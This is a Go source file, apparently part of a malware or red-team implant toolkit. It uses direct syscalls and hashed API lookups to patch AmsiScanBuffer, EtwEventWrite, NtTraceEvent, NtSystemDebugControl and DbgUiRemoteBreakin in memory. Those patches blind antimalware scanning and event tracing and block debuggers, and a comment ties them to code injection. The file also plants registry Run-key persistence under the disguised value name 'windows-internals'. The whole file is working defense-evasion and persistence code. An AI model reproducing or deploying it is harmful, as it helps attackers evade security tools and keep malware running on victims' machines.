package winapi

import (
	"fmt"
	"unsafe"
	"os"
	"os/user"
	"github.com/carved4/go-native-syscall/pkg/debug"
	"github.com/carved4/go-native-syscall/pkg/obf"
	"github.com/carved4/go-native-syscall/pkg/syscallresolve"
)

func PatchAMSI() error {
	// 1. Get the base address of amsi.dll
	amsiHash := obf.GetHash("amsi.dll")
	amsiBase := syscallresolve.GetModuleBase(amsiHash)
	if amsiBase == 0 {
		return fmt.Errorf("amsi.dll not found (not loaded)")
	}

	// 2. Get the address of AmsiScanBuffer
	functionHash := obf.GetHash("AmsiScanBuffer")
	procAddr := syscallresolve.GetFunctionAddress(amsiBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("AmsiScanBuffer function not found")
	}

	// 3. Change protection to RWX for that page
	//    Use the "current process" pseudo‐handle (–1 or 0xFFFFFFFFFFFFFFFF)
	const (
		currentProcess      = ^uintptr(0)  // (ULONG_PTR)(-1)
		PAGE_EXEC_READWRITE = 0x40         // PAGE_EXECUTE_READWRITE
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect))) // we discard the new "oldProtect" here
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

func PatchETW() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of EtwEventWrite
	functionHash := obf.GetHash("EtwEventWrite")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("EtwEventWrite function not found")
	}

	// 3. Change protection to RWX for that page
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))  // Fixed: use actual patch size (3 bytes)
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// PatchDbgUiRemoteBreakin patches DbgUiRemoteBreakin to prevent remote debugger attachment
func PatchDbgUiRemoteBreakin() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of DbgUiRemoteBreakin
	functionHash := obf.GetHash("DbgUiRemoteBreakin")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("DbgUiRemoteBreakin function not found")
	}

	// 3. Change protection to RWX
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0xC3} // ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// PatchNtTraceEvent patches NtTraceEvent to prevent trace event logging
func PatchNtTraceEvent() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of NtTraceEvent
	functionHash := obf.GetHash("NtTraceEvent")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("NtTraceEvent function not found")
	}

	// 3. Change protection to RWX
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// PatchNtSystemDebugControl patches NtSystemDebugControl to prevent debug control operations
func PatchNtSystemDebugControl() error {
	// 1. Get the base address of ntdll.dll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return fmt.Errorf("ntdll.dll not found")
	}

	// 2. Get the address of NtSystemDebugControl
	functionHash := obf.GetHash("NtSystemDebugControl")
	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
	if procAddr == 0 {
		return fmt.Errorf("NtSystemDebugControl function not found")
	}

	// 3. Change protection to RWX
	const (
		currentProcess      = ^uintptr(0)
		PAGE_EXEC_READWRITE = 0x40
	)
	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
	patchSize := uintptr(len(patch))
	oldProtect := uintptr(0)
	status, err := DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		uintptr(PAGE_EXEC_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
	}

	// 4. Overwrite with the patch bytes
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	// 5. Restore the original protection
	status, _ = DirectSyscall(
		"NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&procAddr)),
		uintptr(unsafe.Pointer(&patchSize)),
		oldProtect,
		uintptr(unsafe.Pointer(&oldProtect)))
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
	}

	return nil
}

// ApplyAllPatches applies all security bypass patches and returns a summary
func ApplyAllPatches() (successful []string, failed map[string]error) {
	successful = make([]string, 0)
	failed = make(map[string]error)

	patches := map[string]func() error{
		"AMSI":                  PatchAMSI,
		"ETW":                   PatchETW,
		"DbgUiRemoteBreakin":    PatchDbgUiRemoteBreakin,
		"NtTraceEvent":          PatchNtTraceEvent,
		"NtSystemDebugControl":  PatchNtSystemDebugControl,
	}

	for name, patchFunc := range patches {
		if err := patchFunc(); err != nil {
			failed[name] = err
		} else {
			successful = append(successful, name)
		}
	}

	return successful, failed
}

// ApplyCriticalPatches applies only the most important patches (AMSI and ETW)
// These are the safest to apply pre injection post allocation, sometimes ETW will interfere with mem allocation for god knows why
func ApplyCriticalPatches() (successful []string, failed map[string]error) {
	successful = make([]string, 0)
	failed = make(map[string]error)

	patches := map[string]func() error{
		"AMSI": PatchAMSI,
		"ETW":  PatchETW,
	}

	for name, patchFunc := range patches {
		if err := patchFunc(); err != nil {
			failed[name] = err
		} else {
			successful = append(successful, name)
		}
	}

	return successful, failed
} 

func CreateRunKey() error {
	debug.Printfln("PERSISTENCE", "Starting CreateRunKey() for registry persistence\n")
	
	// 1. Get the current executable's path
	executablePath, err := os.Executable()
	if err != nil {
		debug.Printfln("PERSISTENCE", "Failed to get executable path: %v\n", err)
		return fmt.Errorf("failed to get executable path: %w", err)
	}
	debug.Printfln("PERSISTENCE", "Current executable path: %s\n", executablePath)

	// 2. Get current user's SID string to build the HKCU path
	currentUser, err := user.Current()
	if err != nil {
		debug.Printfln("PERSISTENCE", "Failed to get current user: %v\n", err)
		return fmt.Errorf("failed to get current user: %w", err)
	}
	sid := currentUser.Uid
	debug.Printfln("PERSISTENCE", "Current user SID: %s\n", sid)

	// 3. Open HKCU root key (\Registry\User\<SID>)
	hkcuPath := `\Registry\User\` + sid
	debug.Printfln("PERSISTENCE", "Opening HKCU registry path: %s\n", hkcuPath)
	unicodeHkcuPath := NewUnicodeString(StringToUTF16(hkcuPath))

	var objectAttributes OBJECT_ATTRIBUTES
	objectAttributes.Length = uint32(unsafe.Sizeof(objectAttributes))
	objectAttributes.RootDirectory = 0
	objectAttributes.ObjectName = &unicodeHkcuPath
	objectAttributes.Attributes = OBJ_CASE_INSENSITIVE

	var hkcuHandle uintptr
	status, err := NtOpenKey(
		&hkcuHandle,
		KEY_ALL_ACCESS,
		uintptr(unsafe.Pointer(&objectAttributes)),
	)
	if err != nil {
		debug.Printfln("PERSISTENCE", "NtOpenKey for HKCU failed: %v\n", err)
		return fmt.Errorf("NtOpenKey for HKCU failed: %w", err)
	}
	if !IsNTStatusSuccess(status) {
		debug.Printfln("PERSISTENCE", "NtOpenKey for HKCU failed with status: 0x%x\n", status)
		return fmt.Errorf("NtOpenKey for HKCU failed with status: 0x%x", status)
	}
	debug.Printfln("PERSISTENCE", "Successfully opened HKCU registry key (handle: 0x%x)\n", hkcuHandle)
	defer NtClose(hkcuHandle)

	// 4. Create the Run key relative to the HKCU handle
	runKeyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
	debug.Printfln("PERSISTENCE", "Creating/opening Run registry subkey: %s\n", runKeyPath)
	unicodeRunKeyPath := NewUnicodeString(StringToUTF16(runKeyPath))

	// Re-initialize ObjectAttributes for the subkey, pointing to the parent key handle
	var subkeyObjectAttributes OBJECT_ATTRIBUTES
	subkeyObjectAttributes.Length = uint32(unsafe.Sizeof(subkeyObjectAttributes))
	subkeyObjectAttributes.RootDirectory = hkcuHandle
	subkeyObjectAttributes.ObjectName = &unicodeRunKeyPath
	subkeyObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE

	var runKeyHandle uintptr
	var disposition uintptr
	status, err = NtCreateKey(
		&runKeyHandle,
		KEY_ALL_ACCESS,
		uintptr(unsafe.Pointer(&subkeyObjectAttributes)),
		0,
		0,
		REG_OPTION_NON_VOLATILE,
		&disposition,
	)
	if err != nil {
		debug.Printfln("PERSISTENCE", "NtCreateKey for Run key failed: %v\n", err)
		return fmt.Errorf("NtCreateKey for Run key failed: %w", err)
	}
	if !IsNTStatusSuccess(status) {
		debug.Printfln("PERSISTENCE", "NtCreateKey for Run key failed with status: 0x%x\n", status)
		return fmt.Errorf("NtCreateKey for Run key failed with status: 0x%x", status)
	}
	debug.Printfln("PERSISTENCE", "Successfully created/opened Run key (handle: 0x%x, disposition: %d)\n", runKeyHandle, disposition)
	defer NtClose(runKeyHandle)

	// 5. Set the value in the Run key to point to the current executable
	valueName := "windows-internals"
	unicodeValueName := NewUnicodeString(StringToUTF16(valueName))
	valueData := StringToUTF16(executablePath)
	valueDataSize := uintptr((len(executablePath) + 1) * 2) // Include null terminator

	status, err = NtSetValueKey(
		runKeyHandle,
		uintptr(unsafe.Pointer(&unicodeValueName)),
		0,
		REG_SZ,
		unsafe.Pointer(valueData),
		valueDataSize,
	)
	if err != nil {
		return fmt.Errorf("NtSetValueKey failed: %w", err)
	}
	if !IsNTStatusSuccess(status) {
		return fmt.Errorf("NtSetValueKey failed with status: 0x%x", status)
	}

	return nil
} 